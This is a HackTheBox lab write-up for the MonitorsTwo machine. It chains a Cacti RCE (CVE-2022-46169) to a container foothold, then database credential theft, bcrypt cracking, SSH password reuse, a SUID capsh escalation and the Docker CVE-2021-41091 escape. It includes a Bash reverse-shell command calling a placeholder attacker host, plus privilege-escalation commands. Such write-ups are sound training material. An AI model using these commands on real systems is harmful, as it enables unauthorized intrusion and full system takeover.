## Hello everyone!

Today, we will explore *MonitorsTwo*, an easy-level machine from **HackTheBox**.

Without further ado, let’s get started!

![image](/HTB/MonitorsTwo/MonitorsTwo_images/1.png)

(Please ensure that you have added the following line  `TARGET_IP     monitorstwo.htb` to your local `/etc/hosts` file to enable **DNS resolution**)





## Information Gathering



First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the target machine:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/2.png)

We can identify two exposed services:

**SSH** (OpenSSH 8.2p1 | 22)

**HTTP** (nginx 1.18.0 | 80)

We can start by inspecting the website hosted on port **80**. ****The **Nmap Script Engine** indicates through the `http-title` script that the root webpage is a login panel from the **Cacti** web application:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/3.png)

As expected, we face a **Cacti** login panel. The webpage allows us to identify the application version which is **1.2.22**. We can use `searchsploit` to search for potential vulnerabilities affecting **Cacti v1.2.22**:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/4.png)

There is a **Python** exploit script hosted in **Exploit-DB** that perfectly matches the targeted application version. The vulnerability, referenced as **CVE-2022-46169,** is an **unauthenticated remote command** **execution** vulnerability (RCE) that allows arbitrary command execution. Let’s execute it with the `-h` switch to obtain more information about its usage:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/5.png)

The script requires the target URL, the attacker's IP address, and the port on which a **Netcat listener** is waiting for the incoming reverse shell.

For some reason, the script didn’t work for me. I tried various IP formats and enpoints, but without success. We still can exploit the vulnerability through a Python script I found in a GitHub repository. We can, again, download it and execute it with the -h switch to learn more about its usage:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/7.png)

It appears that we simply need to provide the target IP/domain and a system command to execute on it. A simple **Bash reverse shell** payload can be executed to obtain our initial access on the machine. We would use the following command:

`python3 cve-2022-46169.py monitors.htb bash -c “bash -i >& /dev/tcp/ATTACKER_IP/NC_PORT 0>&1”’`

![image](/HTB/MonitorsTwo/MonitorsTwo_images/8.png)

We successfully obtained initial access on the target system as the **www-data** user!

Looking at the **hostname**, it appears that we are in a container. Since the shell does not have job control, we can run the following commands to upgrade it in order to execute system commands properly:

`script -qc /bin/bash /dev/null`

`export TERM=xterm`




## **Container Escape**



Honnestly, I found during the enumeration phase a `capsh` binary with a **root SUID** bit set on it that could allow us to elevate to root in the container. But then, i found something better in the `/` directory: an `entrypoint.sh` script.

 Although we don’t have the permissions to execute it, we have read permissions. Inspecting the script reveals an interesting `mysql` command:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/9.png)

The script reveals the presence of a **MySQL** database running locally on the target. Moreover, the script contains valid root credentials that we can use to enumerate the database and find a valid user which may have reused his password for **SSH** access. Since we gained an initial foothold on the target machine, the following command to access the local MySQL database can be used:

`mysql --host=db --user=root --password=root` 

Listing the available `cacti` database, we can observe several tables ****associated to users:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/10.png)

But the first `user_auth` table looks interesting. Let’s dump all its content running the following SQL statement:

`SELECT * FROM user_auth;`

![image](/HTB/MonitorsTwo/MonitorsTwo_images/11.png)

The table contains three **bcrypt** hashes for three existing users in the **Cacti** application. Moreover, we can identify an **admin** username associated to a user named **Jamie**, and a **marcus** user. Let’s assume that the user dangerously reused their password for the web application through **SSH**, we could attempt to crack the hash in order to obtain our initial access outside the container, on the real target host.

Attempting to crack the **jamie**’s password hash isn’t conclusive. But let’s try to crack the second hash. For hash cracking, **John the Ripper** or **Hashcat** can be used. Here, we will use `john`.
Since the hashing algorithm is **bcrypt**, we need to provide it via the `—-format option`. The following command can be used:

`john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

![image](/HTB/MonitorsTwo/MonitorsTwo_images/12.png)

Password cracking was successful: we recovered the `funkymonkey` cleartext password for the user **marcus**. Let’s verify whether this password has been reused by authenticating us via **SSH**:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/13.png)

Indeed, that is the case! We successfully escaped the container by enumerating a MySQL database running locally and abusing a password reuse issue. We are now authenticated on the real host as the user **marcus**. We can list the current directory to retrieve the user flag:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/14.png)





## Privilege Escalation



We now need to escalate our current privileges to **root** in order to retrieve the final flag.

It is a good practice to start enumerating local privilege escalation vectors by running `sudo -l` when we have a valid password. It reveals whether the user we compromised is able to run any command with **root privileges**:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/15.png)

But here, it seems that we can’t do this.  Checking cron jobs, capabilities or binaries with the SUID bit set on it doesn’t reveal anything. However, there is an interesting mail addressed to **marcus** in the `/var/mail` directory:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/16.png)

The **administrator** sent a generic mail to warning about three recently discovered vulnerabilities. It suggests that mitigation is requiered. The third vulnerability (**CVE-2021-41091**) seems to be the one causing the most concern for the sender of the email. System users are prompted to update their **Moby** Docker engine as soon as possible to avoid any issue.

Searching for this vulnerability led me to a GitHub Repository hosting a Bash script exploiting the vulnerability:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/17.png)

We can download it to our local machine and transfer it to the target in order to escalate our privileges:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/18.png)

We then give it execute permissions and execute it:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/19.png)

The script confirms the vulnerability occurring. However, it appears that we need to obtain root access in the container to set the SUID bit on the `/bin/bash` binary in order to make the privilege escalation on the real host possible.

 But wait… do you remember the `capsh` binary with the SUID bit set on it i mentioned earlier? Indeed, there was a way to escalate to **root** in the container by abusing a binary owned by root that has the SUID bit set on it. Getting back to our container, the binary can be identified by listing SUID binaries with the following command:

`find / -type f -perm -04000 2>/dev/null`

![image](/HTB/MonitorsTwo/MonitorsTwo_images/20.png)

Moreover, we can observe that the binary is owned by **root**, which means that it will be executed with **root privileges**. I recommend to use GTFOBins, a web resource providing much help during the post-exploitation phase on Linux. This website exposes privilege escalation techniques based on binaries exploitation. For instance, this may help you a lot if you identify an uncommon binary that you can run via `sudo` or that has the SUID bit set on it, but you don’t know how to leverage it. **GTFOBins** comes to the rescue by providing the exact command that will allow you to escalate your current privileges.

We can search for the `capsh` binary:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/21.png)

Since the SUID bit is set on the executable, we can spawn an interactive system shell as **root** running the following command:

`capsh —-git=0 —-uid=0 —`

![image](/HTB/MonitorsTwo/MonitorsTwo_images/22.png)

As expected, the command allowed us to gain root access in the container!

The next step consists to set the SUID bit on the `/bin/bash` binary via the following command: 

`chmod u+s /bin/bash`

![image](/HTB/MonitorsTwo/MonitorsTwo_images/23.png)

Since we are **root**, `/bin/bash` will be executed with **root privileges**, leading to the spawning of a **root shell**.

However, we can’t simply execute the binary in the real host because these are two different environments:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/24.png)

This is where the Bash script we downloaded comes into play. Because we set a root SUID bit on the `/bin/bash` binary, the script will be able to perform the privilege escalation:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/25.png)

The exploit worked successfully, but the Bash shell didn’t spawn instantly. We need to execute the binary from the vulnerable path, which is `/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged`.

![image](/HTB/MonitorsTwo/MonitorsTwo_images/26.png)

We successfully escalated our privileges to **root** in the real host, granting full access and control over the target system. Please note that we needed to provide the `-p` option to the command in order to not drop root privileges during its execution.

We are now able to navigate to the `/root` directory and retrieve the final flag:

![image](/HTB/MonitorsTwo/MonitorsTwo_images/27.png)

Challenge completed!

![image](/HTB/MonitorsTwo/MonitorsTwo_images/28.png)




## Conclusion


This challenges demonstrates how **multiple low-severity misconfigurations chained together** can lead from an initial access to a complete system compromise. We started from a vulnerable web application that exposed its version directly in the page. We could identify the application version, which was vulnerable to an **unauthenticated remote code execution**, allowing us to obtain an initial access on the target system in a **Docker container**. Since we got a foothold on the local machine, we were able to access a MySQL database that was running **locally** on the target machine with legitimate credentials we found in a Bash script exposed in the `/` directory. This allowed us to retrieve the password hash for the user **marcus**, that we were able to crack successfully using John The Ripper. Because the **marcus** password has been reused over **SSH**, we were able to authenticate successfully on the host, escaping the Docker container. We learned from a mail found in the `/var/mail` directory that a Docker Engine (**Moby**) vulnerability remained. Then, we had to obtain root access in the container by exploiting a binary with the root SUID set to it to set a SUID bit on the `/bin/bash` executable in order to transfer it to the real host through the use of a Bash script exploiting **CVE-2021-41091**. ****This weakness allows access to `/bin/bash` from the real host via the **overlay2** storage. This led us to spawn a **root Bash shell**, granting us full access and control outside the container.


**Thank you for reading!**
